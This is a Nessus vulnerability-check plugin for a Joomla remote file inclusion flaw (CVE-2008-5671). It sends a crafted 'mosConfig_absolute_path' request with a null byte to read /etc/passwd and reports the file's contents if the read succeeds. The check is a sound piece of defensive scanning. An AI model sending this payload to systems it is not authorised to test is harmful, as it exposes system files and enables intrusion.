#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31095);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-5671");
  script_bugtraq_id(27795);
  script_xref(name:"OSVDB", value:"42123");

  script_name(english:"Joomla! index.php mosConfig_absolute_path Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Joomla");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include attack." );
 script_set_attribute(attribute:"description", value:
"The version of Joomla installed on the remote host fails to sanitize
user-supplied input to the 'mosConfig_absolute_path' parameter of the
'index.php' script before using it to include PHP code provided
'RG_EMULATION' is not defined in the configuration file, as would
typically occur when upgrading from an older version, and PHP's
'register_globals' setting is disabled.  An unauthenticated remote
attacker can exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-02/0217.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.joomla.org/content/view/4609/1/" );
 script_set_attribute(attribute:"solution", value:
"Either edit the application's 'configuration.php' file to disable
'RG_EMULATION' as described in the advisory above or upgrade to Joomla
1.0.15 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  file = "/etc/passwd";

  req = http_get(
    item:string(
      dir, "/index.php?", 
      "mosConfig_absolute_path=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    string(file, "\\0/includes/version.php") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    string("include(", file, ") [function.include]: failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ("<br" >< contents) contents = contents - strstr(contents, "<br");

      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
